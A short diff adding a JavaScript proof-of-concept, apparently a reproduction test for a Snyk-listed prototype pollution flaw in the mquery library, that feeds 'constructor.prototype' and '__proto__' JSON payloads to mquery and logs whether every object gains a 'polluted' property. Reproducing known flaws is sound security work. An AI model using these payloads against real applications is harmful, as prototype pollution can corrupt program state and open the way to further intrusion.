@@ -1,0 +1,11 @@
+// //https://snyk.io/vuln/SNYK-JS-MQUERY-1050858
+// test("prototype pollution in mquery", () => {
+  const mquery = require("mquery");
+  let obj = {};
+  //var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
+  var payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
+console.log({}.polluted);
+
+  var m = mquery(payload);
+console.log({}.polluted);
+// });
